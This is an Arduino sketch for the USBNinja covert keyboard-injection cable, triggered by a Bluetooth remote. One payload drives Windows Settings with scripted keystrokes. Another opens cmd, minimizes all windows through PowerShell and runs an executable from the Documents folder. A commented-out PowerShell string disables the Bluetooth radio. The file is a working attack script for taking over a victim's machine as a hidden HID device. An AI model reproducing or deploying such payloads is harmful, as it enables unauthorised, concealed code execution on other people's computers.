#define LAYOUT_FRENCH // Add this line before include
// can switch Keyboard layout.
#include <NinjaKeyboard.h>

/*https://www.usbninja.com/
This is the Code of Using Bluetooth remote control triggers Ninja to go
online, and act as a keyboard output characters.

payloadA() {}
When the Bluetooth remote control button A is pressed.
The program in payloadA() will be executed in a loop.
Until the button A is released.

payloadB() {}
When the Bluetooth remote control button B is pressed.
The program in payloadB() will be executed in a loop.
Until the button B is released.

setup() and loop() don't need to do anything.

*/

// char tmpString[1297] = "echo|set/p=[CmdletBinding()] Param () If ((Get-Service bthserv).Status -eq 'Stopped') {Start-Service bthserv} Add-Type -AssemblyName System.Runtime.WindowsRuntime;$asTaskGeneric=([System.WindowsRuntimeSystemExtensions].GetMethods()|?{$_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0];Function Await($WinRtTask,$ResultType) {$asTask = $asTaskGeneric.MakeGenericMethod($ResultType);$netTask=$asTask.Invoke($null,@($WinRtTask));$netTask.Wait(-1) | Out-Null;$netTask.Result};[Windows.Devices.Radios.Radio,Windows.System.Devices,ContentType=WindowsRuntime] | Out-Null;[Windows.Devices.Radios.RadioAccessStatus,Windows.System.Devices,ContentType=WindowsRuntime] | Out-Null;Await ([Windows.Devices.Radios.Radio]::RequestAccessAsync()) ([Windows.Devices.Radios.RadioAccessStatus]) | Out-Null;$radios=Await ([Windows.Devices.Radios.Radio]::GetRadiosAsync()) ([System.Collections.Generic.IReadOnlyList[Windows.Devices.Radios.Radio]]);$bluetooth = $radios | ? {$_.Kind -eq 'Bluetooth'};[Windows.Devices.Radios.RadioState,Windows.System.Devices,ContentType=WindowsRuntime] | Out-Null;Await ($bluetooth.SetStateAsync('Off')) ([Windows.Devices.Radios.RadioAccessStatus]) | Out-Null>>ArduinoMemory.txt";

int repeatPayloadB = 0;

void setup()
{
  // SetRunOnce(PAYLOADA,true);
  // SetRunOnce(PAYLOADB,true);
  // If you want payload to run only once, run this function.
  Serial.print("a");
}
//
void loop() {}

/*
When the Bluetooth remote control button A is pressed.
The program in payloadA() will be executed in a loop.
Until the button A is released.
*/

void payloadA()
{

  USBninjaOnline(); // USBNinja appears.  The cable's data
                    // line was temporarily cut off.
  /*
  You should call NinjaKeyboard.begin() after you call
  NinjaKeyboard.end()
  Or, the NinjaKeyboard was disconnected and any action was not usable.
  */
  NinjaKeyboard.begin();     // Initliaze NinjaKeyboard USB Interface.
  NinjaKeyboard.delay(1000); // Delay 1 sec to compatibility Win7,
                             // Some systems require 5 sec of preparation time.
  NinjaKeyboard.sendKeyStroke(0); // Send HID '0' to compatibility Win7.
  NinjaKeyboard.delay(1000);      // Delay 1 second to wait system.
                             // Recognize the NinjaKeyboard.
  /*If you write a long string, you should use function F("") to include
  your string. Due to the Ninja`s RAM was only 512Byte, this function
  can write the string to Flash, and read it once a char to decrease
  the available memory.
  If you do not use this function, the string may load to RAM while
  the program start. The RAM use Bigger than 488Byte will cause
  runtime error.
  print() will write the string without Enter Key,
  println() will write the string with Enter Key.
  */
  // NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  //  Press two keys at the same time, "R" key and "win logo".
  // Call out the run window.
  // NinjaKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);
  // Press SHIFT to compatible Chinese Input Method.
  // NinjaKeyboard.delay(100);
  // NinjaKeyboard.sendKeyStroke(KEY_ENTER);
  // NinjaKeyboard.delay(500);
  // NinjaKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);
  // Press SHIFT to compatible Chinese Input Method.
  NinjaKeyboard.sendKeyStroke(KEY_I, MOD_GUI_LEFT);
  NinjaKeyboard.delay(1000);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_DOWN);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_ENTER);
  NinjaKeyboard.delay(1000);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_ENTER);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_SPACE);
  NinjaKeyboard.delay(1000);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_TAB);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_ENTER);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_DOWN);
  NinjaKeyboard.delay(100);
  NinjaKeyboard.sendKeyStroke(KEY_ENTER);

  /*
  While your cable connect to Some Phone, Only switch USB DATA was
  not enough. The PC was still think that your phone was Ninja
  (Your Phone Not send USB ReEmulate command), it may cause
  non-stoppable input or NinjaKeyboard Device still Retain in your system.
  */
  NinjaKeyboard.end(); // Send Disconnect command to
                       // NinjaKeyboard USB Interface
  USBninjaOffline();     // USBNinja disappear. Cable Line back to normal.
  NinjaKeyboard.begin(); // ReStart Keyboard Interface while USB DATA
                         // was cut off. So you can use payloadB without
  // ReEmulate NinjaKeyboard.
}

/*
When the Bluetooth remote control button B is pressed.
The program in payloadB() will be executed in a loop.
Until the button B is released.
*/

void payloadB()
{
  if (repeatPayloadB == 0)
  {
    USBninjaOnline();               // USBNinja appears.
                                    // The cable's data line was temporarily cut off.
    NinjaKeyboard.sendKeyStroke(0); // Send HID '0' to compatibility Win7.
    /*If you write a long string, you should use function F("") to include
    your string. Due to the Ninja`s RAM was only 512Byte, this function
    can write the string to Flash, and read it once a char to decrease
    the available memory.
    If you do not use this function, the string may load to RAM while
    the program start. The RAM use Bigger than 488Byte will cause
    runtime error.
    print() will write the string without Enter Key,
    println() will write the string with Enter Key.
    */
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(KEY_TAB);
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(KEY_TAB);
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(KEY_TAB);
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    repeatPayloadB += 1;
  }
  else if (repeatPayloadB == 1)
  {
    USBninjaOnline();               // USBNinja appears.
                                    // The cable's data line was temporarily cut off.
    NinjaKeyboard.sendKeyStroke(0); // Send HID '0' to compatibility Win7.
    /*If you write a long string, you should use function F("") to include
    your string. Due to the Ninja`s RAM was only 512Byte, this function
    can write the string to Flash, and read it once a char to decrease
    the available memory.
    If you do not use this function, the string may load to RAM while
    the program start. The RAM use Bigger than 488Byte will cause
    runtime error.
    print() will write the string without Enter Key,
    println() will write the string with Enter Key.
    */
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    NinjaKeyboard.delay(500);
    NinjaKeyboard.print(F("cmd"));
    NinjaKeyboard.delay(100);
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(100);
    NinjaKeyboard.println(F("powershell -command (new-object -com shell.application).minimizeall()"));
    NinjaKeyboard.delay(100);
    NinjaKeyboard.println(F("cd Documents"));
    NinjaKeyboard.delay(100);
    NinjaKeyboard.println(F("start test.exe"));
  }
}
